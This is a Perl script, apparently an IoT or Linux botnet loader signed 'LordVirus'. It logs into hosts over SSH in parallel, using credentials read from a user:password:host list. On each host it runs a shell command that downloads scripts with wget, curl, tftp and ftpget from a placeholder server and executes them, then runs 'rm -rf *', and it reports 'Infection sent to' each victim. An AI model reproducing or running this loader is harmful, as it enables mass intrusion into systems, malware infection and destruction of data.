#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "[36;1mCan't read file '$file' [$!][0;00m\n"; @newarray; while (<fh>){ @array = split(':',$_);
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i <
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/8UsA.sh; curl -O http://0.0.0.0/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 0.0.0.0 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 0.0.0.0; chmod 777 t8UsA2.sh; sh t8UsA2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 8UsA1.sh 8UsA1.sh; sh 8UsA1.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[32;1mInfection sent to[35;1m: [34;1m".$newarray[$a]."[35;1m:[34;1m".$newarray[$b]."[35;1m~[36;1m".$newarray[$c]." [0;00m\n";
                } else {
                        print "\e[33;1mLogin Unsuccessful At[35;1m: [36;1m".$newarray[$c]." [0;00m\n";
                }
        } else {
                print "\e[31;1mConnection Not Established At[35;1m: [36;1m".$newarray[$c]." [0;00m\n"; #LordVirus W/H
        }
        $pm->finish;
}
$pm->wait_all_children;